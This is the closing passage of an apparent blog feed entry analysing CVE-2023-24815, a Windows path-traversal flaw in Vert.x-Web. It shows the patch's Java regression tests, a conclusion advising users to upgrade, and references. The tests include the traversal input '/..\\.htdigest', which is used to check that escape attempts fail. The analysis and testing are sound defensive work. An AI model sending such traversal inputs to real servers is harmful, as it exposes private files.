    router.routeWithRegex(&quot;.*&quot;).handler(StaticHandler.create(&quot;www&quot;));
    // attempt to escape to classpath, given that the handler is mounted on a regex,
    testRequest(HttpMethod.GET, &quot;/..\\.htdigest&quot;, 404, &quot;Not Found&quot;);
  }

  @Test
  public void testEscapeToClasspathFromFixedPath() throws Exception {
    router.clear();
    router.routeWithRegex(&quot;/&quot;).handler(StaticHandler.create(&quot;www&quot;));
    // attempt to escape to classpath, given that the handler is mounted on a regex,
    testRequest(HttpMethod.GET, &quot;/..\\.htdigest&quot;, 404, &quot;Not Found&quot;);
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Finally, We highlighted the issue and the mistake behind it &amp;amp; explained the vulnerable code by analyzing and going through it, Also, We discuss the the patch and how the vulnerability got patched in a simple way. To protect yourself from this vulnerability simply upgrade to the last version&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;https://vertx.io/docs/vertx-web/java/&lt;/li&gt;
  &lt;li&gt;https://github.com/vert-x3/vertx-web/blob/62c0d66fa1c179ae6a4d57344631679a2b97e60f/vertx-web/src/main/java/io/vertx/ext/web/impl/Utils.java#L83&lt;/li&gt;
  &lt;li&gt;https://github.com/vert-x3/vertx-web/commit/9e3a783b1d1a731055e9049078b1b1494ece9c15&lt;/li&gt;
  &lt;li&gt;https://github.com/vert-x3/vertx-web&lt;/li&gt;
  &lt;li&gt;https://jar-download.com/artifacts/io.vertx/vertx-web&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Zeyad Azima</name></author><summary type="html">Introduction A vulnerability discovered in Vert.x-Web known as CVE-2023-24815, a threat actor can exploit this vulnerability to escape the path filter leading to exfiltrate any class path resource or Path Traversal, When tunning on windows.</summary></entry></feed>